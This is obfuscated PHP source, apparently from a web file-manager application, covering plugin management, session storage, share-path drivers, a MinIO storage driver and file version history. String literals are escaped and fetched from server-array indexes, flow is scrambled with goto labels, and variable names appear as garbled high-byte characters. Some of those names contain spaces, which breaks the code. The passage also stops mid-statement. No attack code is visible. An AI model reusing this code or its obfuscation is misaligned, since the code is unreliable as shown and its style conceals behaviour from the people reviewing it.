PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\56\x70\x6c\x75\147\151\x6e\114\151\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\x73\x74\141\164\x75\163", "\162\x65\147\151\x65\x73\164", "\x63\x6f\156\x66\x69\x67"); public function loadList($î≤óÊÌõ = false) { $ò‡ıú¡Á = array_to_keyvalue($this->listData(), $_SERVER[ëæªã÷][32]); if ($î≤óÊÌõ) { return $ò‡ıú¡Á[$î≤óÊÌõ]; } return $ò‡ıú¡Á; } public function init() { $òÒ¿¿Û™ =& $_SERVER[ëæªã÷]; Hook::trigger($òÒ¿¿Û™[1913]); $«‡ß÷∑≥ = $this->loadPluginList(); foreach ($«‡ß÷∑≥ as $·æÓ∂îú => $à˝ÉØ˚§) { $Õïàÿ˜û = $this->appAllow($·æÓ∂îú, $à˝ÉØ˚§); if (!$Õïàÿ˜û) { continue; } foreach ($à˝ÉØ˚§[$òÒ¿¿Û™[1914]] as $£ñûÈ—« => $ÅÍƒÍŒÀ) { Hook::bind($£ñûÈ—«, $ÅÍƒÍŒÀ); } } Hook::trigger($òÒ¿¿Û™[1915]); Hook::trigger(ACTION); } public function appAllow($ëÂ¥≤ÔÏ, $‚˜∏”ñ, $˚©±¨Ó÷ = true) { $‡àŸÕ¶ê =& $_SERVER[ëæªã÷]; $õ”Ü¥„ï = PLUGIN_DIR . $ëÂ¥≤ÔÏ . $‡àŸÕ¶ê[1916]; if (!is_array($‚˜∏”ñ) || !is_array($‚˜∏”ñ[$‡àŸÕ¶ê[1914]]) || $‚˜∏”ñ[$‡àŸÕ¶ê[730]] != 1 || !is_file($õ”Ü¥„ï)) { return !1; } if ($GLOBALS[$‡àŸÕ¶ê[505]] == 1) { return !0; } if ($˚©±¨Ó÷ && !Action($‡àŸÕ¶ê[1917])->checkAuth($ëÂ¥≤ÔÏ)) { return !1; } return !0; } public function unInstall($—·∞ù˜Ã) { $È¥ô˛ââ =& $_SERVER[ëæªã÷]; $ˆÉøÈ§˘ = $this->loadList($—·∞ù˜Ã); if (file_exists(PLUGIN_DIR . $—·∞ù˜Ã)) { Hook::apply($—·∞ù˜Ã . $È¥ô˛ââ[1918]); } $this->remove($ˆÉøÈ§˘[$È¥ô˛ââ[401]]); } public function changeStatus($ø…Œ™ìó, $ªß¶ù›‹) { $Ã‘‹àºï =& $_SERVER[ëæªã÷]; $ù»‚Úî† = $this->loadList($ø…Œ™ìó); if ($ªß¶ù›‹) { Hook::apply($ø…Œ™ìó . $Ã‘‹àºï[1919]); } $this->update($ù»‚Úî†[$Ã‘‹àºï[401]], array($Ã‘‹àºï[1920] => $ªß¶ù›‹)); } public function appRegist($ÓÒ¡·¥£, $îﬂñêûø) { $ª‹¢»Ú =& $_SERVER[ëæªã÷]; $ê˙π™Á» = $this->loadList($ÓÒ¡·¥£); if ($ê˙π™Á») { $this->update($ê˙π™Á»[$ª‹¢»Ú[401]], array($ª‹¢»Ú[1914] => $îﬂñêûø)); } else { $€åÎÈÑ≤ = array($ª‹¢»Ú[32] => $ÓÒ¡·¥£, $ª‹¢»Ú[1914] => $îﬂñêûø, $ª‹¢»Ú[730] => 0, $ª‹¢»Ú[6] => $this->getConfigDefault($ÓÒ¡·¥£)); $this->insert($€åÎÈÑ≤); } } public function getConfigDefault($ëæ¸±ı§) { $ë®ÓÔ–Ø =& $_SERVER[ëæªã÷]; $ô∂˚ø˝¯ = array(); $è√ÑÉ°î = $this->getPackageJson($ëæ¸±ı§); if (!$è√ÑÉ°î && is_array($è√ÑÉ°î[$ë®ÓÔ–Ø[1921]])) { return $ô∂˚ø˝¯; } foreach ($è√ÑÉ°î[$ë®ÓÔ–Ø[1921]] as $• ¡˛ﬂ⁄ => $∫õ˘ƒ—–) { if (!isset($∫õ˘ƒ—–[$ë®ÓÔ–Ø[378]]) || isset($ô∂˚ø˝¯[$• ¡˛ﬂ⁄])) { continue; } $ô∂˚ø˝¯[$• ¡˛ﬂ⁄] = $∫õ˘ƒ—–[$ë®ÓÔ–Ø[378]]; } return $ô∂˚ø˝¯; } public function getPackageJson($ÓÛø∆≈ÿ) { return Hook::apply($ÓÛø∆≈ÿ . $_SERVER[ëæªã÷][1922]); } public function getConfig($ñØ«˜∫Ω, $Ö˙“Ÿó… = false) { $ÉíΩ˜¬ =& $_SERVER[ëæªã÷]; $·Õπ‰õ∆ = array(); $⁄©÷“¨† = $this->loadList($ñØ«˜∫Ω); if ($⁄©÷“¨† && is_array($⁄©÷“¨†[$ÉíΩ˜¬[6]])) { $·Õπ‰õ∆ = $⁄©÷“¨†[$ÉíΩ˜¬[6]]; } if (!$·Õπ‰õ∆ || $Ö˙“Ÿó…) { $·Õπ‰õ∆ = $this->getConfigDefault($ñØ«˜∫Ω); } return $·Õπ‰õ∆; } public function setConfig($óØÂéˆÙ, $˘¯˚ÙœÈ = false) { $©≠≤›≠◊ =& $_SERVER[ëæªã÷]; $ø‹åÇÅÇ = $this->loadList($óØÂéˆÙ); if (!$ø‹åÇÅÇ) { return !1; } $®º§°∫‰ = $ø‹åÇÅÇ[$©≠≤›≠◊[6]]; if ($˘¯˚ÙœÈ == !1) { $®º§°∫‰ = array(); $˘¯˚ÙœÈ = $this->getConfigDefault($óØÂéˆÙ); } foreach ($˘¯˚ÙœÈ as $ﬂ∑Ã˜ó => $πÆØÏÔ›) { $®º§°∫‰[$ﬂ∑Ã˜ó] = is_string($πÆØÏÔ›) ? trim($πÆØÏÔ›) : $πÆØÏÔ›; } $this->update($ø‹åÇÅÇ[$©≠≤›≠◊[401]], array($©≠≤›≠◊[6] => $®º§°∫‰)); } public function viewList() { $‹Ì≥ÔΩ‹ =& $_SERVER[ëæªã÷]; $îﬁπÕÉÇ = $this->loadList(); $this->pluginScan($îﬁπÕÉÇ); $îﬁπÕÉÇ = $this->loadPluginList(); $ô†„È„ë = array(); foreach ($îﬁπÕÉÇ as $¯¨É©Ø√ => $¨ëﬂ≈µï) { unset($¨ëﬂ≈µï[$‹Ì≥ÔΩ‹[1914]], $¨ëﬂ≈µï[$‹Ì≥ÔΩ‹[6]]); $√ôÏâÄò = PLUGIN_DIR . $¨ëﬂ≈µï[$‹Ì≥ÔΩ‹[32]] . $‹Ì≥ÔΩ‹[1916]; if (!is_file($√ôÏâÄò)) { continue; } $≥ìÚ÷áÚ = Hook::apply($¨ëﬂ≈µï[$‹Ì≥ÔΩ‹[32]] . $‹Ì≥ÔΩ‹[1922]); if (is_array($≥ìÚ÷áÚ)) { $ô†„È„ë[$¯¨É©Ø√] = array_merge($¨ëﬂ≈µï, $≥ìÚ÷áÚ); } } return $ô†„È„ë; } private function loadPluginList() { $Œˆì‹”≈ =& $_SERVER[ëæªã÷]; $ã⁄Øˆûç = $this->loadList(); if (strtolower(MOD) == $Œˆì‹”≈[1923]) { return $ã⁄Øˆûç; } $âÌ∂—¡± = Hook::trigger($Œˆì‹”≈[1924], $ã⁄Øˆûç); if ($ã⁄Øˆûç && !$âÌ∂—¡±) { die; } return $âÌ∂—¡± ? $âÌ∂—¡± : $ã⁄Øˆûç; } private function pluginScan($„˛ÎõÊ†) { $´·—öÏ÷ =& $_SERVER[ëæªã÷]; recursion_dir(PLUGIN_DIR, $ò≠‡£ªÇ, $…ˆ˙¿ª¿, 0); foreach ($ò≠‡£ªÇ as $˘È∂≥•§) { $ƒåŸ˝î˛ = get_path_this($˘È∂≥•§); if (isset($„˛ÎõÊ†[$ƒåŸ˝î˛]) || !file_exists($˘È∂≥•§ . $´·—öÏ÷[1925]) || !file_exists($˘È∂≥•§ . $´·—öÏ÷[1916])) { continue; } Hook::apply($ƒåŸ˝î˛ . $´·—öÏ÷[1919]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\145\155\137\163\x65\x73\163\151\157\156"; public function get($ıõµõôÖ) { $òÜŸ‹¢Ñ =& $_SERVER[ëæªã÷]; $Û˘˘†¡° = $this->where(array($òÜŸ‹¢Ñ[1926] => $ıõµõôÖ))->find(); if (!is_array($Û˘˘†¡°)) { return !1; } return $Û˘˘†¡°[$òÜŸ‹¢Ñ[735]]; } public function set($ﬁı¢»≤≥, $ƒ™Ì™¸©, $â±©Öƒ‚ = 3600) { $Ì€˜ƒÅç =& $_SERVER[ëæªã÷]; $¬ˆ¨®˛÷ = array($Ì€˜ƒÅç[1926] => $ﬁı¢»≤≥, $Ì€˜ƒÅç[1834] => $ƒ™Ì™¸©, $Ì€˜ƒÅç[1927] => $â±©Öƒ‚ + time()); if (Session::get($Ì€˜ƒÅç[1928])) { $¬ˆ¨®˛÷[$Ì€˜ƒÅç[1628]] = Session::get($Ì€˜ƒÅç[1928]); } else { $¬ˆ¨®˛÷[$Ì€˜ƒÅç[1628]] = 0; } if ($this->get($ﬁı¢»≤≥)) { return $this->where(array($Ì€˜ƒÅç[1926] => $ﬁı¢»≤≥))->save($¬ˆ¨®˛÷); } else { return $this->add($¬ˆ¨®˛÷, array(), !0); } } public function remove($´÷·æ∞Â) { return $this->where(array($_SERVER[ëæªã÷][1926] => $´÷·æ∞Â))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ëæªã÷][1929] . time())->delete(); } } goto FÙ°òå‚¯õ; a¡˜û“Ë≥ß: class PathDriverDbShareItem extends PathDriverDB { public function __construct($Äø≈Ü–˘) { $this->pathParse = $Äø≈Ü–˘; $this->model = Model($_SERVER[ëæªã÷][1301]); } public function getPathOuter($¥¸ÕÉÿŒ) { $˙˝àµØ– =& $_SERVER[ëæªã÷]; if (!$¥¸ÕÉÿŒ) { return $¥¸ÕÉÿŒ; } $œÍ∏∆˝≤ = $this->parse($¥¸ÕÉÿŒ); return trim(KodIO::makeShare($this->pathParse[$˙˝àµØ–[401]], $œÍ∏∆˝≤[$˙˝àµØ–[401]]), $˙˝àµØ–[8]); } protected function infoParse($∫Îü’¬û, $∞ÏﬁÎè· = false, $”çÁ∂ıö = false) { $•∞Ü’áå =& $_SERVER[ëæªã÷]; $©˜¡¬≥ = $this->pathParse[$•∞Ü’áå[401]]; $Ã˛¸œÔÛ = trim($this->pathParse[$•∞Ü’áå[1143]], $•∞Ü’áå[8]); return Action($•∞Ü’áå[1309])->sharePathInfo($©˜¡¬≥, $Ã˛¸œÔÛ, $∞ÏﬁÎè·); } public function infoFull($áœÍ›ÉŸ) { $Â⁄‹Ö∆≠ =& $_SERVER[ëæªã÷]; $ÚÁïõôá = explode($Â⁄‹Ö∆≠[8], trim($áœÍ›ÉŸ, $Â⁄‹Ö∆≠[8])); if (count($ÚÁïõôá) > 1) { $ôÄ˛Å≠∏ = implode($Â⁄‹Ö∆≠[8], array_splice($ÚÁïõôá, 1)); $€∫ØÖÎÜ = $this->model->pathInfoByPath($ÚÁïõôá[0], $ôÄ˛Å≠∏); if (!$€∫ØÖÎÜ) { return !1; } $this->pathParse[$Â⁄‹Ö∆≠[1143]] = $€∫ØÖÎÜ[$Â⁄‹Ö∆≠[403]]; } return $this->infoParse($áœÍ›ÉŸ); } public function listAll($å¡†áó¡) { $ß∏Ÿ◊Œ≥ =& $_SERVER[ëæªã÷]; $ªã·Î¥† = IO::info($this->pathParse[$ß∏Ÿ◊Œ≥[88]]); if (!$ªã·Î¥†) { return array(); } $»Ù®ÓΩÎ = $this->model->listAll($å¡†áó¡); $˛»Ñ©Õ» = Model($ß∏Ÿ◊Œ≥[595])->getInfo($ªã·Î¥†[$ß∏Ÿ◊Œ≥[488]]); $Òï˚ÅÕÈ = Action($ß∏Ÿ◊Œ≥[1309]); foreach ($»Ù®ÓΩÎ as &$Çæ≠®‘) { check_abort(); $Çæ≠®‘[$ß∏Ÿ◊Œ≥[97]] = $Òï˚ÅÕÈ->_shareItemeParse($Çæ≠®‘[$ß∏Ÿ◊Œ≥[97]], $˛»Ñ©Õ»); } unset($Çæ≠®‘); return $»Ù®ÓΩÎ; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($–†§èÊ…) { $this->pathParse = $–†§èÊ…; $this->model = Model($_SERVER[ëæªã÷][1301]); } protected function infoParse($‡ô˝¬‹ë, $°çÀÜø¿ = false, $ö•ÊÈ—â = false) { $äŸáË•± =& $_SERVER[ëæªã÷]; return Action($äŸáË•±[1149])->sharePathInfo($this->pathParse[$äŸáË•±[88]], !0, $°çÀÜø¿); } public function listPath($·øΩÖÛë, $ö–ﬂÂÃ∑ = false) { $Ñ˝˘⁄¸√ =& $_SERVER[ëæªã÷]; $–êô◊È = parent::listPath($·øΩÖÛë, $ö–ﬂÂÃ∑); if (!$–êô◊È) { return $–êô◊È; } if (is_array($–êô◊È[$Ñ˝˘⁄¸√[1310]])) { $–êô◊È[$Ñ˝˘⁄¸√[1310]] = Action($Ñ˝˘⁄¸√[1149])->shareItemInfo($–êô◊È[$Ñ˝˘⁄¸√[1310]]); } foreach ($–êô◊È as $˚Ÿ∞Œ≈è => $¨ßÇÃ∞’) { if (!in_array($˚Ÿ∞Œ≈è, array($Ñ˝˘⁄¸√[86], $Ñ˝˘⁄¸√[87]))) { continue; } foreach ($¨ßÇÃ∞’ as $≈ÍÚ≠ó¨ => $ÆÂ√ó‚¢) { $–êô◊È[$˚Ÿ∞Œ≈è][$≈ÍÚ≠ó¨] = Action($Ñ˝˘⁄¸√[1149])->shareItemInfo($ÆÂ√ó‚¢); } } return $–êô◊È; } public function listAll($≈ú√Ú…ì) { $£±ìüÈ¡ =& $_SERVER[ëæªã÷]; $Áµ˚ﬁÁ = IO::info($this->pathParse[$£±ìüÈ¡[88]]); if (!$Áµ˚ﬁÁ) { return array(); } $≈Ø∫óÚ„ = $this->model->listAll($≈ú√Ú…ì); foreach ($≈Ø∫óÚ„ as &$†⁄§€ÅŸ) { $†⁄§€ÅŸ[$£±ìüÈ¡[97]] = Action($£±ìüÈ¡[1149])->shareItemInfo($†⁄§€ÅŸ[$£±ìüÈ¡[97]]); } unset($†⁄§€ÅŸ); return $≈Ø∫óÚ„; } } class PathDriverDriverShareItem { public function __construct($Æﬂ≤ª‹Á) { $this->pathParse = $Æﬂ≤ª‹Á; } public function __call($√§Á˘∑Ω, $‹“¨Á„Í) { $ïË—‰ÀÎ =& $_SERVER[ëæªã÷]; if (method_exists($this, $√§Á˘∑Ω)) { return; } $å˛ñ¬Ïõ = call_user_func_array(array($ïË—‰ÀÎ[1311], $√§Á˘∑Ω), $‹“¨Á„Í); $¬ï˚Óƒ“ = array($ïË—‰ÀÎ[1312], $ïË—‰ÀÎ[1313], $ïË—‰ÀÎ[1314], $ïË—‰ÀÎ[1315], $ïË—‰ÀÎ[549], $ïË—‰ÀÎ[551], $ïË—‰ÀÎ[1316], $ïË—‰ÀÎ[118], $ïË—‰ÀÎ[1317], $ïË—‰ÀÎ[1318]); if (in_array($√§Á˘∑Ω, $¬ï˚Óƒ“)) { $å˛ñ¬Ïõ = $this->getPathOuter($å˛ñ¬Ïõ); } return $å˛ñ¬Ïõ; } public function copy($ﬂéà˜Ωï, $‹˛”Ë°Î, $“‡˜‘∞¥ = false, $ØÚá€©Ã = false) { return $this->copyMove($ﬂéà˜Ωï, $‹˛”Ë°Î, $“‡˜‘∞¥, $_SERVER[ëæªã÷][549], $ØÚá€©Ã); } public function move($ºé˝Á¨¨, $†‚Ôö˚Ò, $…õÑ ùÀ = false, $õˆ§”»© = false) { return $this->copyMove($ºé˝Á¨¨, $†‚Ôö˚Ò, $…õÑ ùÀ, $_SERVER[ëæªã÷][551], $õˆ§”»©); } private function copyMove($‚Í⁄¿¬ , $≥∂¸ÕïÑ, $’Ä¬Á€Ü, $àåÉµ„–, $«ÿüÏ⁄Ω = false) { $≤¢˘Æπ¢ =& $_SERVER[ëæªã÷]; $≈îÂÊ≥” = $≥∂¸ÕïÑ; $˘ˆ¬˛˝≥ = IO::driverMake($≥∂¸ÕïÑ); if ($˘ˆ¬˛˝≥->pathParse[$≤¢˘Æπ¢[1127]]) { $≥∂¸ÕïÑ = $˘ˆ¬˛˝≥->pathParse[$≤¢˘Æπ¢[1127]]; } else { $≥∂¸ÕïÑ = $≈îÂÊ≥”; } $®„ÎØ¸ô = IO::copyMove($‚Í⁄¿¬ , $≥∂¸ÕïÑ, $’Ä¬Á€Ü, $àåÉµ„–, $«ÿüÏ⁄Ω); $®„ÎØ¸ô = $this->getPathOuter($®„ÎØ¸ô); return $®„ÎØ¸ô; } public function pathThis($£≠öƒ€Ü) { return get_path_this($this->pathParse[$_SERVER[ëæªã÷][88]]); } public function pathFather($Æƒ˝£®Å) { return get_path_father($this->pathParse[$_SERVER[ëæªã÷][88]]); } public function iconvSystem($«ª™é¬¿) { return $«ª™é¬¿; } protected function infoParse($ ÒÔß—ú, $¿úΩµª• = false) { $¶•ÂãÀ• =& $_SERVER[ëæªã÷]; $›ê‡»®» = $this->pathParse[$¶•ÂãÀ•[486]][$¶•ÂãÀ•[1150]] . $this->pathParse[$¶•ÂãÀ•[1143]]; if ($¿úΩµª•) { $Ê∑ÎõÅπ = IO::infoWithChildren($›ê‡»®»); } else { $Ê∑ÎõÅπ = IO::info($›ê‡»®»); } $Õ¿Àô¥ô = $this->pathParse[$¶•ÂãÀ•[486]]; return Action($¶•ÂãÀ•[1309])->_shareItemeParse($Ê∑ÎõÅπ, $Õ¿Àô¥ô); } public function listAll($¶çÆê“˝) { $™†ﬁıÑ≠ =& $_SERVER[ëæªã÷]; $Ì⁄…¥™∏ = IO::listAll($¶çÆê“˝); $„¿˘œõ = $this->pathParse[$™†ﬁıÑ≠[486]]; foreach ($Ì⁄…¥™∏ as &$∆Ú∆ô—Å) { check_abort(); $•Ë≈ë¿˛ = IO::info($∆Ú∆ô—Å[$™†ﬁıÑ≠[88]]); $•Ë≈ë¿˛ = is_array($•Ë≈ë¿˛) ? $•Ë≈ë¿˛ : array(); $∆Ú∆ô—Å = array_merge($•Ë≈ë¿˛, $∆Ú∆ô—Å); $∆Ú∆ô—Å[$™†ﬁıÑ≠[97]] = Action($™†ﬁıÑ≠[1309])->_shareItemeParse($∆Ú∆ô—Å, $„¿˘œõ); } unset($∆Ú∆ô—Å); return $Ì⁄…¥™∏; } public function getPathOuter($»Å¢ÓèÎ) { $˙—â‚¯± =& $_SERVER[ëæªã÷]; $Î≤“€úÎ = KodIO::parse($»Å¢ÓèÎ); if ($Î≤“€úÎ[$˙—â‚¯±[33]] == KodIO::KOD_SHARE_ITEM) { return $Î≤“€úÎ[$˙—â‚¯±[88]]; } $‚Ù¿»ÏØ = KodIO::clear($»Å¢ÓèÎ); $‹Ñ¸à‡£ = KodIO::clear($this->pathParse[$˙—â‚¯±[486]][$˙—â‚¯±[1150]]); $”ˆ¸ÙÄã = substr($‚Ù¿»ÏØ, strlen($‹Ñ¸à‡£)); if (substr($‚Ù¿»ÏØ, 0, strlen($‹Ñ¸à‡£)) != $‹Ñ¸à‡£) { return !1; } return $this->pathParse[$˙—â‚¯±[1144]] . $˙—â‚¯±[8] . ltrim($”ˆ¸ÙÄã, $˙—â‚¯±[8]); } public function getType() { $›∞ù˙˛µ =& $_SERVER[ëæªã÷]; $ë∆¡ﬁ˜ì = str_replace($›∞ù˙˛µ[84], $›∞ù˙˛µ[12], get_class($this)); return strtolower($ë∆¡ﬁ˜ì); } public function isTypeObject($É‘‘„òä) { return IO::isTypeObject($É‘‘„òä); } public function info($˙Ãë≈∏¸) { return $this->infoParse($˙Ãë≈∏¸); } public function infoAuth($˘ÛÒ∂Ë≈) { return $this->infoParse($˘ÛÒ∂Ë≈); } public function infoWithChildren($Æ¿˚ô¬Û) { return $this->infoParse($Æ¿˚ô¬Û, !0); } public function infoFull($∆é‰≥áÇ) { return $this->infoParse($∆é‰≥áÇ); } } goto Bø•ÿêãËè; B¨Áë˘±â™: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($…„≠ıå˙) { parent::__construct($…„≠ıå˙); $this->signatureVersion($_SERVER[ëæªã÷][221]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } define($_SERVER[ëæªã÷][242], 1); define($_SERVER[ëæªã÷][243], 2); goto a‘¨·√ÕÛß; d·ç©Âñ≤ã: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\x75\x72\143\x65\x5f\x68\x69\x73\x74\x6f\x72\x79"; public function historyCount($òƒºÔ€˛) { $˝ÂÃı“‘ =& $_SERVER[ëæªã÷]; if (!$òƒºÔ€˛) { return array(); } if (is_string($òƒºÔ€˛) || is_int($òƒºÔ€˛)) { $òƒºÔ€˛ = array($òƒºÔ€˛); } $∫Ä…§”√ = array($˝ÂÃı“‘[403], $˝ÂÃı“‘[1828] => $˝ÂÃı“‘[500]); $—™ŸŸ∂Ä = array($˝ÂÃı“‘[403] => array($˝ÂÃı“‘[7], $òƒºÔ€˛)); $¿Öú´éÊ = $this->field($∫Ä…§”√)->where($—™ŸŸ∂Ä)->group($˝ÂÃı“‘[403])->select(); return array_to_keyvalue($¿Öú´éÊ, $˝ÂÃı“‘[403], $˝ÂÃı“‘[500]); } public function addHistory($òπ’éÉÚ, $‡ÍÒº¥ = '') { $πÏ˘÷»Ô =& $_SERVER[ëæªã÷]; $Å‹ËÌ»Ö = array($πÏ˘÷»Ô[418] => $òπ’éÉÚ[$πÏ˘÷»Ô[403]], $πÏ˘÷»Ô[1619] => isset($òπ’éÉÚ[$πÏ˘÷»Ô[454]]) ? $òπ’éÉÚ[$πÏ˘÷»Ô[454]] : $òπ’éÉÚ[$πÏ˘÷»Ô[452]], $πÏ˘÷»Ô[468] => $òπ’éÉÚ[$πÏ˘÷»Ô[467]], $πÏ˘÷»Ô[579] => $òπ’éÉÚ[$πÏ˘÷»Ô[90]], $πÏ˘÷»Ô[2029] => $‡ÍÒº¥); $≈¿Úä∂≤ = $GLOBALS[$πÏ˘÷»Ô[6]][$πÏ˘÷»Ô[100]][$πÏ˘÷»Ô[1183]]; if ($≈¿Úä∂≤ > 1) { $this->historyAutoClear($Å‹ËÌ»Ö[$πÏ˘÷»Ô[403]]); $this->add($Å‹ËÌ»Ö); } Hook::trigger($πÏ˘÷»Ô[2030], $Å‹ËÌ»Ö); Model($πÏ˘÷»Ô[2031])->eventFileEdit($òπ’éÉÚ[$πÏ˘÷»Ô[403]]); } private function historyAutoClear($Ìô≤§ÅÌ) { $¢ﬁÈ≈ÊÌ =& $_SERVER[ëæªã÷]; $»´Ü≈Üı = Model($¢ﬁÈ≈ÊÌ[750])->get($¢ﬁÈ≈ÊÌ[1205]); $ÍÃ¬Ó∏É = $GLOBALS[$¢ﬁÈ≈ÊÌ[6]][$¢ﬁÈ≈ÊÌ[100]][$¢ﬁÈ≈ÊÌ[1183]]; $º¿â∑ù≥ = $»´Ü≈Üı == $¢ﬁÈ≈ÊÌ[1206] ? 5 : $ÍÃ¬Ó∏É; if ($ÍÃ¬Ó∏É <= 1) { $º¿â∑ù≥ = 1; } if ($º¿â∑ù≥ >= 500) { return; } $Æ´£ìâÃ = array($¢ﬁÈ≈ÊÌ[418] => $Ìô≤§ÅÌ); $»æ≠Áÿ¸ = $this->field($¢ﬁÈ≈ÊÌ[2032])->where($Æ´£ìâÃ)->order($¢ﬁÈ≈ÊÌ[2026])->select(); if (!$»æ≠Áÿ¸ || $º¿â∑ù≥ >= count($»æ≠Áÿ¸)) { return; } $âÀÁ∑»É = array_to_keyvalue($»æ≠Áÿ¸, $¢ﬁÈ≈ÊÌ[12], $¢ﬁÈ≈ÊÌ[401]); $âÀÁ∑»É = array_slice($âÀÁ∑»É, $º¿â∑ù≥); $∂˝œ±≠å = array_to_keyvalue($»æ≠Áÿ¸, $¢ﬁÈ≈ÊÌ[12], $¢ﬁÈ≈ÊÌ[467]); $∂˝œ±≠å = array_slice($∂˝œ±≠å, $º¿â∑ù≥); if (!$âÀÁ∑»É || !$∂˝œ±≠å) { return; } $Æ´£ìâÃ = array($¢ﬁÈ≈ÊÌ[420] => array($¢ﬁÈ≈ÊÌ[7], $âÀÁ∑»É)); $this->where($Æ´£ìâÃ)->delete(); Model($¢ﬁÈ≈ÊÌ[470])->remove($∂˝œ±≠å); } public function listData($ÅË¢—Äó) { $ƒ„∞Óªâ =& $_SERVER[ëæªã÷]; $·Ü˛©…Ÿ = array($ƒ„∞Óªâ[418] => $ÅË¢—Äó); $ö’¯•òù = $ƒ„∞Óªâ[2033]; $Ó¡–ô˛Õ = $this->field($ö’¯•òù)->where($·Ü˛©…Ÿ)->order($ƒ„∞Óªâ[2026])->selectPage(); $this->_listAppendUser($Ó¡–ô˛Õ[$ƒ„∞Óªâ[373]]); $ÖÊıÉâÁ = Model($ƒ„∞Óªâ[750])->get($ƒ„∞Óªâ[1205]); $ÿ‡ƒÉ—´ = 5; if ($ÖÊıÉâÁ == $ƒ„∞Óªâ[1206]) { $Ó¡–ô˛Õ[$ƒ„∞Óªâ[373]] = array_slice($Ó¡–ô˛Õ[$ƒ„∞Óªâ[373]], 0, $ÿ‡ƒÉ—´); $Ó¡–ô˛Õ[$ƒ„∞Óªâ[370]] = array($ƒ„∞Óªâ[2034] => 1, $ƒ„∞Óªâ[2035] => 20, $ƒ„∞Óªâ[2036] => 1, $ƒ„∞Óªâ[2037] => count($Ó¡–ô˛Õ[$ƒ„∞Óªâ[373]])); } return $Ó¡–ô˛Õ; } protected function _listAppendUser(&$ﬁÖ˝¿º») { $ΩõÆàµå =& $_SERVER[ëæªã÷]; $éŒ‰·‚Í = array_to_keyvalue($ﬁÖ˝¿º», $ΩõÆàµå[12], $ΩõÆàµå[1628]); $—ªıëÀ˙ = Model($ΩõÆàµå[538])->userListInfo($éŒ‰·‚Í); foreach ($ﬁÖ˝¿º» as &$øŒÌ∑ê†) { $äŒﬁõ„è = $øŒÌ∑ê†[$ΩõÆàµå[1628]]; $øŒÌ∑ê†[$ΩõÆàµå[452]] = $—ªıëÀ˙[$äŒﬁõ„è] ? $—ªıëÀ˙[$äŒﬁõ„è] : !1; } unset($øŒÌ∑ê†); } public function fileInfo($·‘õ¬Ê•) { $ÃŒ ≤≤´ =& $_SERVER[ëæªã÷]; $÷©ú¢≠ﬂ = $this->tablePrefix; $Œ€é ΩÇ = "{$÷©ú¢≠ﬂ}\x69\157\x5f\x66\151\154\x65\x20\146\x69\x6c\x65\x73\x20\157\156\40\x66\151\154\145\x73\x2e\146\151\154\145\111\104\40\x3d\x20\x68\151\x73\164\x6f\162\x79\x2e\x66\151\154\145\111\104"; return $this->alias($ÃŒ ≤≤´[2038])->where(array($ÃŒ ≤≤´[420] => $·‘õ¬Ê•))->join($Œ€é ΩÇ, $ÃŒ ≤≤´[2039])->find(); } public function removeItem($úñ— óú) { $ﬁú˛ˆ≤∫ =& $_SERVER[ëæªã÷]; $ÁõßôÓ≥ = array($ﬁú˛ˆ≤∫[420] => $úñ— óú); $ÀÕÂèáê = $this->where($ÁõßôÓ≥)->find(); if ($ÀÕÂèáê) { $†§ä«èï = $this->where($ÁõßôÓ≥)->delete(); Model($ﬁú˛ˆ≤∫[470])->remove($ÀÕÂèáê[$ﬁú˛ˆ≤∫[467]]); return $†§ä«èï; } return !1; } public function removeBySource($¶Èâ„°ö) { $îê°Ì»Ã =& $_SERVER[ëæªã÷]; if (!$¶Èâ„°ö) { return !1; } if (!is_array($¶Èâ„°ö)) { $¶Èâ„°ö = array($¶Èâ„°ö); } $˜âë≈¥ù = array($îê°Ì»Ã[418] => array($îê°Ì»Ã[7], $¶Èâ„°ö)); $æµÂÿ¨ç = $this->field($îê°Ì»Ã[468])->where($˜âë≈¥ù)->select(); if ($æµÂÿ¨ç) { $this->where($˜âë≈¥ù)->delete(); $‘˛•ô®Ÿ = array_to_keyvalue($æµÂÿ¨ç, $îê°Ì»Ã[12], $îê°Ì»Ã[467]); Model($îê°Ì»Ã[470])->remove($‘˛•ô®Ÿ); } return !0; } public function setDetail($˘çèπô», $„Õ‰îÇä) { $à¿Ô∞¬® =& $_SERVER[ëæªã÷]; return $this->where(array($à¿Ô∞¬®[420] => $˘çèπô»))->save(array($à¿Ô∞¬®[2029] => $„Õ‰îÇä)); } public function rollbackToItem($§ˆπ˘ÛÒ, $¢ü÷åó˚) { $˘ê⁄˚òõ =& $_SERVER[ëæªã÷]; $•‘û º™ = Model($˘ê⁄˚òõ[805])->sourceInfo($§ˆπ˘ÛÒ); $this->addHistory($•‘û º™, LNG($˘ê⁄˚òõ[2040])); $¿≥……˙∏ = $this->find($¢ü÷åó˚); $÷±ëÁ…µ = array($˘ê⁄˚òõ[467] => $¿≥……˙∏[$˘ê⁄˚òõ[467]], $˘ê⁄˚òõ[90] => $¿≥……˙∏[$˘ê⁄˚òõ[90]], $˘ê⁄˚òõ[96] => time(), $˘ê⁄˚òõ[454] => USER_ID); Model($˘ê⁄˚òõ[805])->where(array($˘ê⁄˚òõ[403] => $§ˆπ˘ÛÒ))->save($÷±ëÁ…µ); return $this->where(array($˘ê⁄˚òõ[420] => $¢ü÷åó˚))->delete(); } public function clearSame($‰‰≠ª∫™) { $›®˘ÙÂç =& $_SERVER[ëæªã÷]; $™Î¸√Í° = $this->listData($‰‰≠ª∫™); $œËò¶ﬁ› = array_to_keyvalue_group($™Î¸√Í°, $›®˘ÙÂç[467]); $≠Í§Ÿ„≠ = array(); $”µ˛ÅÇ€ = array(); foreach ($œËò¶ﬁ› as $ˆ›¢ü¸µ) { if (!$ˆ›¢ü¸µ || count($ˆ›¢ü¸µ) <= 1) { continue; } foreach ($ˆ›¢ü¸µ as $Ï‹˜ï∂ﬂ) { $≠Í§Ÿ„≠[] = $Ï‹˜ï∂ﬂ[$›®˘ÙÂç[467]]; $”µ˛ÅÇ€[] = $Ï‹˜ï∂ﬂ[$›®˘ÙÂç[401]]; } } if (!$”µ˛ÅÇ€) { return; } $this->where(array($›®˘ÙÂç[401] => 